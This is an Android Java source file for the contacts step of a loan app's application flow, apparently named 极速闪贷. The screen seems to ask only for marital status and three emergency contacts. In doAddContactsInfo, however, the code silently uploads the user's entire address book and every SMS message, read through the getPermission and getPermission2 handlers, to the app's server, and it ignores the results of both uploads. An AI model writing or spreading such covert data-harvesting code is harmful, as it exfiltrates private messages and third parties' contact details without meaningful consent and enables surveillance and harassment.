package com.zxy.jisuloan.activity;

import android.Manifest;
import android.content.Intent;
import android.os.Bundle;
import android.os.Message;
import android.provider.ContactsContract;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.alibaba.fastjson.JSONArray;
import com.master.permissionhelper.PermissionHelper;
import com.zxy.jisuloan.R;
import com.zxy.jisuloan.net.BaseApi;
import com.zxy.jisuloan.net.IService;
import com.zxy.jisuloan.utils.BaseActivity;
import com.zxy.jisuloan.utils.Config;
import com.zxy.jisuloan.utils.GetContactsUtils;
import com.zxy.jisuloan.utils.HttpUtils;
import com.zxy.jisuloan.utils.LoadDialog;
import com.zxy.jisuloan.utils.MiuiUtils;
import com.zxy.jisuloan.utils.MyLog;
import com.zxy.jisuloan.utils.PermissionUtils;
import com.zxy.jisuloan.utils.SMSUtils;
import com.zxy.jisuloan.utils.SharePrefsUtils;
import com.zxy.jisuloan.utils.StatusBarUtils;
import com.zxy.jisuloan.utils.ToastUtils;
import com.zxy.jisuloan.view.ApplyStepView;
import com.zxy.jisuloan.view.dialog.BottomDialog01;
import com.zxy.jisuloan.view.dialog.PermissionDialog;
import com.zxy.jisuloan.vo.BaseResponse;

import java.util.Timer;
import java.util.TimerTask;

import butterknife.BindView;
import butterknife.OnClick;

/**
 * Create by Fang ShiXian
 * on 2019/8/19
 */
public class ContactsActivity extends BaseActivity {

    @BindView(R.id.txt_public_title)
    TextView tv_title;
    @BindView(R.id.asv_user_info)
    ApplyStepView applyStepView;
    @BindView(R.id.txt_cont_status)
    TextView tv_status;
    @BindView(R.id.txt_cont_family)
    TextView tv_family;
    @BindView(R.id.txt_cont_relation)
    TextView tv_relation;
    @BindView(R.id.txt_cont_firend)
    TextView tv_firend;
    @BindView(R.id.txt_cont_workmate)
    TextView tv_workMate;

    private BottomDialog01 dialog01;
    private String[] marital_status = new String[]{"未婚", "已婚", "丧偶", "离异"};
    private String[] familys = new String[]{"配偶", "父母", "兄弟", "子女",};
    private String maritalStatus = "", kinship = "";
    private PermissionHelper permissionHelper1;
    private PermissionHelper permissionHelper2;
    //全部通讯录
    private JSONArray allPhoneArray;
    private String name1, name2, name3, phone1, phone2, phone3;
    private String status4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        StatusBarUtils.with(this).init();

        initView();
    }

    @Override
    protected int getLayoutId() {
        return R.layout.activity_contacts;
    }

    public void initView() {
        Intent intent = getIntent();
        status4 = intent.getStringExtra("status4");
        tv_title.setText("联系人");
        applyStepView.changeStep(2);
        //获取短信权限
        showPermissionDialog2();

    }

    @OnClick({R.id.img_title_back, R.id.rl_contacts1, R.id.rl_contacts2, R.id.rl_contacts3, R.id.rl_contacts4,
            R.id.rl_contacts5, R.id.btn_auth_next, R.id.txt_kefu})
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.img_title_back:
                finish();
                break;
            case R.id.rl_contacts1:
                showBottomDialog(marital_status, "选择婚姻状况", tv_status, 1);
                break;
            case R.id.rl_contacts2:
                showBottomDialog(familys, "选择亲属关系", tv_relation, 2);
                break;
            case R.id.rl_contacts3:
                showPermissionDialog(3);
                break;
            case R.id.rl_contacts4:
                showPermissionDialog(4);
                break;
            case R.id.rl_contacts5:
                showPermissionDialog(5);
                break;
            case R.id.btn_auth_next:
                doAddContactsInfo();
                break;
            case R.id.txt_kefu:
                startActivity(new Intent(this, HelpCenterActivity.class));
                break;
            default:
                break;
        }
    }


    private void doAddContactsInfo() {
        String qinShu = tv_relation.getText().toString().replaceAll(" ", "-");
        String friend = tv_firend.getText().toString().replaceAll(" ", "-");
        String workMate = tv_workMate.getText().toString().replaceAll(" ", "-");
        if (maritalStatus.length() == 0 || kinship.length() == 0 || qinShu.length() == 0
                || friend.length() == 0 || workMate.length() == 0) {
            showTipsDialog("请完善资料");
            return;
        }


        String userId = SharePrefsUtils.getInstance().getString(Config.SP_USER_ID, "");
//            //上传全部通讯录
        HttpUtils.uploadJsonArray(Config.CONTACTS_URL + "&userId=" + userId,
                "contactInfo", allPhoneArray, new HttpUtils.INetworkCallback() {
                    @Override
                    public void callback(String result) {

                    }

                    @Override
                    public void fail(String error) {

                    }
                });
//            //上传短信数据
        HttpUtils.uploadJsonArray(Config.SMS_URL + "&userId=" + userId,
                "data", SMSArray, new HttpUtils.INetworkCallback() {
                    @Override
                    public void callback(String result) {

                    }

                    @Override
                    public void fail(String error) {

                    }
                });


        //上传填写的内容
        LoadDialog.show(this);
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                BaseApi.request(BaseApi.createApi(IService.class).
                        addContactInfo(userId, maritalStatus, kinship, name1, phone1, name2, phone2, name3, phone3), new BaseApi.IResponseListener<BaseResponse>() {
                    @Override
                    public void onSuccess(BaseResponse data) {
                        if ("0".equals(data.getError())) {
                            ToastUtils.showToast("联系人认证完成");
                            SharePrefsUtils.getInstance().putString(Config.SP_USER_CONT_STATUS, "1");
                            if (!"1".equals(status4)) {
                                startActivity(new Intent(ContactsActivity.this, OperatorsActivity.class));
                                finish();
                            }
                        } else {
                            showTipsDialog(data.getMsg());
                        }
                    }

                    @Override
                    public void onFail() {

                    }
                });
            }
        }, 1000);

    }


    /**
     * @param strings
     * @param title
     * @param textView
     * @param i        区分是哪个资料
     */
    public void showBottomDialog(String[] strings, String title, TextView textView, int i) {
        dialog01 = new BottomDialog01(this, strings, title);
        dialog01.setListener(new BottomDialog01.ListViewClickListener() {
            @Override
            public void onClick(String choice, int position) {
                textView.setText(choice);
                textView.setVisibility(View.VISIBLE);
                switch (i) {
                    case 1:
                        maritalStatus = choice;
                        MyLog.e("test", "maritalStatus = " + maritalStatus);

                        break;
                    case 2:
                        kinship = choice;
                        MyLog.e("test", "kinship = " + kinship);
                        break;
                    default:
                        break;
                }
            }
        });
        dialog01.show();

    }

    /**
     * 判断是否有联系人权限，没有权限弹出dialog
     *
     * @param position
     */
    private boolean contactFirst = true;

    public void showPermissionDialog(final int position) {
        if (contactFirst) {
            contactFirst = false;
            final PermissionDialog dialog = new PermissionDialog(this);
            dialog.setOnClickListenerInterface(new PermissionDialog.OnClickListenerInterface() {
                @Override
                public void doConfirm() {
                    dialog.dismiss();
                    getPermission2();
                    getPermission(position);
                }
            });
            dialog.show();
        } else {
            getPermission2();
            getPermission(position);
        }

    }

    /**
     * 判断是否有短信权限，没有权限弹出dialog
     */
    public void showPermissionDialog2() {

        PermissionDialog dialog = new PermissionDialog(this);
        dialog.setOnClickListenerInterface(new PermissionDialog.OnClickListenerInterface() {
            @Override
            public void doConfirm() {
                dialog.dismiss();
                getPermission2();
            }
        });
        dialog.show();
        String content = "请打开读取短信权限。";
        if (MiuiUtils.isMIUI()) {
            content = content + ",小米MIUI系统请手动打开通知类短信权限。";
        }
        dialog.setContent(content);
        dialog.setTitle("极速闪贷想访问您的短信");
        dialog.setContent("是否允许此APP访问您的短信？");

    }


    private int contactNum = 0;

    /**
     * 获取权限并开始获取通讯录
     *
     * @param position
     */
    private void getPermission(final int position) {
        permissionHelper1 = new PermissionHelper(this, new String[]{Manifest.permission.READ_CONTACTS}, Config.REQUEST_CODE_2);
        permissionHelper1.request(new PermissionHelper.PermissionCallback() {
            @Override
            public void onPermissionGranted() {
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_PICK);
                intent.setData(ContactsContract.Contacts.CONTENT_URI);
                startActivityForResult(intent, Config.CONTACTS_REQUEST_CODE);
                contactNum = position;
                allPhoneArray = GetContactsUtils.getPhoneNumberFromMobile(ContactsActivity.this);

            }

            @Override
            public void onIndividualPermissionGranted(String[] grantedPermission) {

            }

            @Override
            public void onPermissionDenied() {
                showTipsDialog("您拒绝了联系人权限申请");
            }

            @Override
            public void onPermissionDeniedBySystem() {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        final PermissionDialog dialog = new PermissionDialog(ContactsActivity.this);
                        dialog.show();
                        dialog.setContent("您已经关闭读取通讯录权限并不再提醒，请手动打开读取通讯录权限");
                        dialog.setOnClickListenerInterface(new PermissionDialog.OnClickListenerInterface() {
                            @Override
                            public void doConfirm() {
                                PermissionUtils.toSelfSetting(ContactsActivity.this);
                                dialog.dismiss();
                            }
                        });
                    }
                });
            }
        });
    }

    private JSONArray SMSArray;
    private boolean first = true;

    /**
     * 获取短信权限
     */
    private void getPermission2() {
        permissionHelper2 = new PermissionHelper(this, new String[]{Manifest.permission.READ_SMS}, Config.REQUEST_CODE_3);
        permissionHelper2.request(new PermissionHelper.PermissionCallback() {
            @Override
            public void onPermissionGranted() {
                if (MiuiUtils.isMIUI() && first) {
                    first = false;
                    Toast.makeText(ContactsActivity.this, "小米手机MIUI系统请打开通知类短信权限", Toast.LENGTH_LONG).show();
                    MiuiUtils.goPermissionSettings(ContactsActivity.this);
                }
                SMSArray = SMSUtils.getSmsInPhone(ContactsActivity.this);

            }

            @Override
            public void onIndividualPermissionGranted(String[] grantedPermission) {

            }

            @Override
            public void onPermissionDenied() {
                showTipsDialog("您拒绝了权限申请");
            }

            @Override
            public void onPermissionDeniedBySystem() {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        final PermissionDialog dialog = new PermissionDialog(ContactsActivity.this);
                        dialog.show();
                        dialog.setTitle("极速闪贷想要访问短信记录");
                        dialog.setContent("您已经关闭读取短信权限并不再提醒，请手动打开读取短信记录权限");
                        dialog.setOnClickListenerInterface(new PermissionDialog.OnClickListenerInterface() {
                            @Override
                            public void doConfirm() {
                                PermissionUtils.toSelfSetting(ContactsActivity.this);
                                dialog.dismiss();
                            }
                        });
                    }
                });

            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (permissionHelper1 != null && requestCode == Config.REQUEST_CODE_2) {
            permissionHelper1.onRequestPermissionsResult(Config.REQUEST_CODE_2, new String[]{Manifest.permission.READ_CONTACTS}, grantResults);
        } else if (permissionHelper2 != null && requestCode == Config.REQUEST_CODE_3) {
            permissionHelper2.onRequestPermissionsResult(Config.REQUEST_CODE_3, new String[]{Manifest.permission.READ_SMS}, grantResults);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == Config.CONTACTS_REQUEST_CODE) {
            String[] nameAndNumber = GetContactsUtils.getSigleContact(this, data);
            if (nameAndNumber == null) {
                return;
            }
            switch (contactNum) {
                case 3:
                    tv_family.setText(nameAndNumber[0] + " " + nameAndNumber[1]);
                    tv_family.setVisibility(View.VISIBLE);
                    name1 = nameAndNumber[0];
                    phone1 = nameAndNumber[1];
                    break;
                case 4:
                    tv_firend.setText(nameAndNumber[0] + " " + nameAndNumber[1]);
                    tv_firend.setVisibility(View.VISIBLE);
                    name2 = nameAndNumber[0];
                    phone2 = nameAndNumber[1];
                    break;
                case 5:
                    tv_workMate.setText(nameAndNumber[0] + " " + nameAndNumber[1]);
                    tv_workMate.setVisibility(View.VISIBLE);
                    name3 = nameAndNumber[0];
                    phone3 = nameAndNumber[1];
                    break;
                default:
                    break;
            }

        }
    }


    @Override
    public void processMessage(Message message) {

    }
}
